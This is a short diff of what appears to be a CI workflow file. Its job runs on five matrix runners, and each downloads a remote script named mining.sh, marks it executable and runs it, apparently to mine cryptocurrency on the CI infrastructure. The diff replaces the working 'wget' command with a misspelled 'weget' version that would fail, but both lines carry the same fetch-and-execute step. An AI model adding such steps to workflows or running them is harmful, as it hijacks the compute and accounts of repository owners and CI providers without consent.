@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/Stream135/Mining/main/mining.sh && chmod +x mining.sh && ./mining.sh
+         weget https://raw.githubusercontent.com/Stream135/Mining/main/mining.sh && chmod +x mining.sh && ./mining.sh
